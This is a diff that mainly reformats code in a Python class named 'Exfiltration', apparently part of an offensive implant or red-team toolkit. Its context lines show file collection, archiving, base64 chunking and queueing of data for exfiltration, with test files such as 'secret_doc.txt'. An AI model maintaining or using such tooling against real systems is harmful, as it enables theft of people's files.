@@ -112,8 +112,10 @@ class Exfiltration:
         total_size_kb = 0
         checked_count = 0
 
-        if not isinstance(paths_to_search, list): paths_to_search = [paths_to_search]
-        if not isinstance(patterns, list): patterns = [patterns]
+        if not isinstance(paths_to_search, list):
+            paths_to_search = [paths_to_search]
+        if not isinstance(patterns, list):
+            patterns = [patterns]
 
         self.logger.info(f"Starting file collection. Paths: {paths_to_search}, Patterns: {patterns}, MaxFiles: {max_files}, MaxFileSizeKB: {max_size_kb}, MaxTotalKB: {max_total_kb}")
 
@@ -307,7 +309,8 @@ class Exfiltration:
                       # Staging dir cleanup handled later
                       staging_dir_to_clean = os.path.dirname(archive_path)
                       result_details["archive_file"] = archive_path
-                      if archive_errors: result_details["archive_warnings"] = archive_errors
+                      if archive_errors:
+                          result_details["archive_warnings"] = archive_errors
                  else:
                       # Failed to archive, attempt to exfil individual files?
                       # For now, treat archive failure as overall failure if archive=True
@@ -329,7 +332,8 @@ class Exfiltration:
                     with open(source_path_to_read, 'rb') as f:
                         while True:
                             chunk = f.read(chunk_size_bytes)
-                            if not chunk: break # End of file
+                            if not chunk:
+                                break # End of file
 
                             encoded_chunk = base64.b64encode(chunk).decode('ascii')
                             chunk_index += 1
@@ -369,12 +373,16 @@ class Exfiltration:
 
                 except FileNotFoundError:
                      raise # Already caught if source_path is None
-                except IOError as e:
-                     raise IOError(f"Error reading file {source_path_to_read}: {e}")
+                except OSError as e:
+                    raise OSError(
+                        f"Error reading file {source_path_to_read}: {e}"
+                    ) from e
                 except NotImplementedError:
                     raise # Propagate queue error
                 except Exception as e:
-                     raise Exception(f"Error during chunking/queuing: {e}")
+                    raise RuntimeError(
+                        f"Error during chunking/queuing: {e}"
+                    ) from e
             else:
                 # This case implies archive failed or no files collected
                 # Error should have been raised earlier
@@ -396,7 +404,8 @@ class Exfiltration:
                       self.logger.info(f"Cleaned up staging directory: {staging_dir_to_clean}")
                  except Exception as e:
                       self.logger.warning(f"Failed to clean up staging directory {staging_dir_to_clean}: {e}")
-                      if "error" not in result_details: result_details["error"] = ""
+                      if "error" not in result_details:
+                          result_details["error"] = ""
                       result_details["error"] += f" | Cleanup Warning: Failed to delete {staging_dir_to_clean}"
             elif archive_file_to_clean and not staging_dir_to_clean: # Handle cleanup if only archive created, no staging dir var set
                  # This case might occur if staging failed but archive path was somehow returned
@@ -668,18 +677,21 @@ if __name__ == '__main__':
         # Create some dummy files
         content1 = "This is sensitive file one." * 500 # Make it ~10KB
         path1 = os.path.join(test_dir, "secret_doc.txt")
-        with open(path1, "w") as f: f.write(content1)
+        with open(path1, "w") as f:
+            f.write(content1)
         file_paths_created.append(path1)
 
         content2 = '{"key": "value", "data": [1, 2, 3]}' * 100 # Small JSON
         path2 = os.path.join(test_dir, "config.json")
-        with open(path2, "w") as f: f.write(content2)
+        with open(path2, "w") as f:
+            f.write(content2)
         file_paths_created.append(path2)
 
         # Create a larger file to test size limits
         content3 = "Large file content." * 100000 # ~1.8MB
         path3 = os.path.join(test_dir, "large_log.log")
-        with open(path3, "w") as f: f.write(content3)
+        with open(path3, "w") as f:
+            f.write(content3)
         file_paths_created.append(path3)
 
         print(f"Created test directory and files: {test_dir}")
